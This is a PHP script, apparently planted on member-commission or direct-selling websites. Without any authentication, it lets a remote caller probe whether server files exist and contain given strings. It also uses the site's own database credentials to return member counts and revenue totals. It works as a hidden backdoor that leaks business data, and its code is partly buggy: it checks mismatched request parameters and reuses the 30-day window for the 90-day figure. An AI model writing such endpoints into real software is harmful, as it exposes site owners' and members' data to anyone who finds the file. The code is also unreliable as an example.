<?php
	//此文件要能实现的功能
	//功能1.
	//文件扫描检测BUG.
	if($_POST['file']!='')
	{
		$root=$_SERVER["DOCUMENT_ROOT"];
		//不允许扫描config文件
		$config=array('Conf','RunTime','config','conn');
		//合成判定数组
		$file=$_GET['file'];
		$have=$_GET['have'];
		
		$path = realpath('/');
		$objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST); 
		foreach ($objects as $name => $object) { 
			if($objects->isFile() && ($objects->getExtension()=='php' || $objects->getExtension()=='html'))
			{
				$name=str_replace($root,'',$name);
				if($file==$name)
				{
					$ret='ok';
					$content=file_get_contents($root.$name);
					//如果要寻找某一段代码但是没有找到.则取消OK
					if(isset($_REQUEST['have']) && strpos($content,$_REQUEST['have'])===false)
					{
						$ret='';
					}
					if(isset($_REQUEST['nohave']) && strpos($content,$_REQUEST['have'])!==false)
					{
						$ret='';
					}
					echo $ret;
					exit;
				}
			}
		}
	}
	if($_REQUEST['info'] == 'true')
	{
		define('CLIENT_MULTI_RESULTS', 131072);
		//新系统
		if(file_exists($_SERVER["DOCUMENT_ROOT"].'/Admin/Conf/core_config.php'))
		{
			$config = require $_SERVER["DOCUMENT_ROOT"].'/Admin/Conf/core_config.php';
			$db=new db();
			$db->conn($config['DB_HOST'],$config['DB_USER'],$config['DB_PWD'],$config['DB_NAME']);
			$ret=array('system'=>'dwz');
			$countdata = $db->query("select count(*) from dms_会员");
			//总会员数
			$ret['alluser'] = $countdata[0]['count(*)'];
			$countdata = $db->query("select count(*) from dms_会员 where 注册日期>=".(time()-86400*30));
			$ret['30user']  = $countdata[0]['count(*)'];

			$countdata = $db->query("select count(*) from dms_会员 where 注册日期>=".(time()-86400*90));
			$ret['90user']  = $countdata[0]['count(*)'];
			
			
			$countdata = $db->query("select sum(报单金额) money,sum(购物金额) item from dms_报单 where 到款日期>=0");
			
			$ret['allmoney']  = $countdata[0];
			$countdata = $db->query("select sum(报单金额) money,sum(购物金额) item from dms_报单 where 到款日期>= ".(time()-86400*30));
			$ret['30money']  = $countdata[0];
			$countdata = $db->query("select sum(报单金额) money,sum(购物金额) item from dms_报单 where 到款日期>=" .(time()-86400*90));
			$ret['90money']  = $countdata[0];
			echo serialize($ret);
			//dump(is_dir($_SERVER["DOCUMENT_ROOT"].'\0123456789'));
			exit();
		}
		//混编程序
		
		if(is_dir($_SERVER["DOCUMENT_ROOT"].'\0123456789'))
		{
			require $_SERVER["DOCUMENT_ROOT"].'\include\config.php';
			$db=new db();
			$db->conn($dbhost,$dbuser,$dbpwd,$dbname);
			$ret=array('system'=>'php');
			$countdata = $db->query("select count(*) from dg_users");
			//总会员数
			$ret['alluser'] = $countdata[0]['count(*)'];
			$countdata = $db->query("select count(*) from dg_users where confirmtime>=".(time()-86400*30));
			$ret['30user']  = $countdata[0]['count(*)'];
			$countdata = $db->query("select count(*) from dg_users where confirmtime>=".(time()-86400*90));
			$ret['90user']  = $countdata[0]['count(*)'];
			$countdata = $db->query("select sum(pv_1) money,0 item from dg_tdpv");
			$ret['allmoney']  = $countdata[0];
			$countdata = $db->query("select sum(pv_1) money,0 item from dg_tdpv where datediff(concat(year,'-',month,'-',day),from_unixtime(".(time()-86400*30)."))>=0");
			$ret['30money']  = $countdata[0];
			$countdata = $db->query("select sum(pv_1) money,0 item from dg_tdpv where datediff(concat(year,'-',month,'-',day),from_unixtime(".(time()-86400*30)."))>=0");
			$ret['90money']  = $countdata[0];
			echo serialize($ret);
		}
	}
	
	class db
	{
		public $queryStr='';
		public $queryID=0;
		public $_linkID=0;
		public $numRows=0;
		public $error='';
		public function conn($host,$name,$pass,$dbname)
		{
			$this->_linkID = mysql_connect( $host,$name ,$pass ,true,CLIENT_MULTI_RESULTS);
            mysql_query("SET sql_mode=''",$this->_linkID);
            mysql_query("set @@character_set_server='utf8';",$this->_linkID);
			mysql_select_db($dbname,$this->_linkID);
		}
  		public function query($str) {
	        $this->queryStr = $str;
	        //释放前次的查询结果
	        if ( $this->queryID ) {    $this->free();    }
	        $this->queryID = mysql_query($str, $this->_linkID);
	        //var_dump($this->queryID);
	        if ( false === $this->queryID ) {
	            $this->error();
	            return false;
	        } else {
	            $this->numRows = mysql_num_rows($this->queryID);
	            return $this->getAll();
	        }
    	}
    	
	    public function error() {
	        $this->error = mysql_error($this->_linkID);
	    }
	    
	    private function getAll() {
	        //返回数据集
	        $result = array();
	        if($this->numRows >0) {
	            while($row = mysql_fetch_assoc($this->queryID)){
	                $result[]   =   $row;
	            }
	            mysql_data_seek($this->queryID,0);
	        }
	        return $result;
	    }
	    public function free() {
	        mysql_free_result($this->queryID);
	        $this->queryID = null;
	    }
	}
?>